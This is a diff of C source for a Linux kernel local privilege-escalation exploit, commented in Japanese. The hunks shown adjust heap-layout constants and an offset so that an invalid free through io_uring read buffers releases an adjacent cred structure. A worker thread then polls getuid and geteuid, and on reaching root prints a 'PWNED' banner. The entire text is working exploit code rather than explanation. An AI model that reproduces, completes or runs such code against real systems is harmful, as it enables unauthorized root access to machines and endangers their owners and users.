@@ -31,7 +31,7 @@
 #define PAGE 0x1000UL
 
 #define NUM_IOBUF \
-  0x140  // UNIMPLEMENTED:
+  0x23D  // UNIMPLEMENTED:
          // 微調整して最後のio_bufferがページの最後の方に来るように
 char iobufs[PAGE][NUM_IOBUF] = {0};
 
@@ -204,8 +204,8 @@ void *setcap_worker(void *arg) {
    * 自身のcredが/bin/suのcredによって上書きされるとEUIDが0になる。
    */
   while (state->pwned == 0) {
-    // if (getuid() == 0 || geteuid() == 0) {
-    if (geteuid() == 0) {
+    if (getuid() == 0 || geteuid() == 0) {
+      // if (geteuid() == 0) {
       puts("\n[!] PWNED!!!!!!!!!!!!!!!!!\n");
       state->pwned = 1;
       printf("[!] WHOAMI: uid=%d euid=%d\n", getuid(), geteuid());
@@ -360,9 +360,8 @@ int main(void) {
   /**
    * io_bufferのinvalid freeを使って次のページにあるcredをfreeする。
    */
-  puts("[+] Invoking invalid free of cred...!");
   const ulong cred_offset =
-      0xE0;  // HEURISTIC: 最後のio_bufferと次のページまでのオフセット
+      0x140;  // HEURISTIC: 最後のio_bufferと次のページまでのオフセット
   ring_submit_read(&ring, fd, cred_offset, 0, 0);
   assert(ring_wait_cqe(&ring) == cred_offset);
 
@@ -370,8 +369,6 @@ int main(void) {
    * `/bin/su`を実行するように合図する
    */
   state->cred_uafed = 1;
-
-  usleep(100);
 
   sleep(9999);  // unreachable
 
